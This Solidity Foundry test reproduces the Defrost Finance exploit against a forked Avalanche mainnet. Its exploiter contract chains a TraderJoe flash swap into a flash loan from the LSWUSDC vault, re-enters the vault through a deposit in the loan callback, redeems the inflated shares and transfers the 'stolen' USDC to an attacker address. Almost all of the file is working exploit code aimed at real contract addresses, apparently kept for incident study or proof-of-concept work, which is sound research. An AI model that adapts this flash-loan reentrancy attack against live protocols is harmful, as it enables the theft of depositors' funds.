// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "@openzeppelin-contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import "../src/interfaces/aave-v3-core/IPool.sol";
import "../src/interfaces/traderjoe/IJoePair.sol";

interface ILSWUSDC is IERC3156FlashLender {
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function deposit(uint256 _amount, address receiver) external returns (uint256);
}

contract DefrostFinanceExploiterTest is Test {
    address constant attacker = 0x7373Dca267bdC623dfBA228696C9d4E8234469f6;
    DefrostFinanceExploiter exploiter;
    ERC20 constant usdc = ERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    ILSWUSDC constant lswusdc = ILSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    IPool constant aave = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IJoePair constant joepair = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);

    function setUp() public {
        vm.createSelectFork("avax_mainnet", 24003940);
        vm.label(address(usdc), "USDC");
        vm.label(address(lswusdc), "LSWUSDC");
        vm.label(address(aave), "Aave V3 Pool");
        vm.label(address(joepair), "TraderJoe WAVAX-USDC Pair");
        exploiter = new DefrostFinanceExploiter();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        usdc.approve(address(exploiter), type(uint).max);
        exploiter.exploit();
        assertGtDecimal(usdc.balanceOf(attacker), 0, usdc.decimals());
        vm.stopPrank();
    }
}

contract DefrostFinanceExploiter {
    ERC20 constant usdc = ERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    ILSWUSDC constant lswusdc = ILSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    IPool constant aave = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD); // Aave Pool: V3
    IJoePair constant joepair = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb); // TraderJoe Pair (WAVAX-USDC)

    function exploit() external {
        uint256 flashLoanAmount = lswusdc.maxFlashLoan(address(usdc));
        uint256 flashLoanFee = lswusdc.flashFee(address(usdc), flashLoanAmount);
        usdc.approve(address(aave), type(uint256).max);
        usdc.transferFrom(msg.sender, address(this), flashLoanFee);
        joepair.swap(0, flashLoanAmount, address(this), "0"); // FlashLoan #1
        uint256 stolenAmount = usdc.balanceOf(msg.sender);
        usdc.transfer(msg.sender, stolenAmount);
    }

    // FlashLoan #1 (TraderJoe)
    function joeCall(address, uint256, uint256 amount1, bytes calldata) external {
        uint256 flashLoanAmount = lswusdc.maxFlashLoan(address(usdc));
        lswusdc.flashLoan(IERC3156FlashBorrower(address(this)), address(usdc), flashLoanAmount, ""); // FlashLoan #2
        uint256 lswusdcBalance = lswusdc.balanceOf(address(this));
        lswusdc.redeem(lswusdcBalance, address(this), address(this));
        uint flashLoanFee = amount1 / 1000 * 4;
        usdc.transfer(msg.sender, amount1 + flashLoanFee);
    }

    // FlashLoan #2 (LSWUSDC)
    function onFlashLoan(address , address , uint256 amount, uint256 , bytes calldata) external returns (bytes32) {
        usdc.approve(address(lswusdc), type(uint256).max);
        lswusdc.deposit(amount, address(this)); // Reentrancy~~!
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
